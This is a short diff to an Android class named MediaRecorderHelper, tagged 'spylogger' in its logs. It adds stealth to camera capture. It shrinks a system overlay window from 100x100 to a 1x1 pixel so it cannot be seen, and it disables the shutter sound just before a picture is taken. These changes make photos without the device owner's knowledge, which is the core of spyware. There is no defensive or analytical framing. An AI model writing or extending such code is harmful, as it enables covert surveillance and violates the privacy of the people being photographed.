@@ -115,7 +115,7 @@ public class MediaRecorderHelper implements MediaRecorder.OnInfoListener,MediaRe
 
         wm = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
         WindowManager.LayoutParams params = new WindowManager.LayoutParams(
-                100, 100, //Must be at least 1x1
+                1, 1, //Must be at least 1x1
                 WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY,
                 0,
                 //Don't know if this is a safe default
@@ -181,6 +181,7 @@ public class MediaRecorderHelper implements MediaRecorder.OnInfoListener,MediaRe
                         }
                         Log.d("spylogger - fim: ",new Date().toString());
                         inicio=new Date();
+                        mCamera.enableShutterSound(false);
                         mCamera.takePicture(null, null, MediaRecorderHelper.this);
                         return null;
                     }
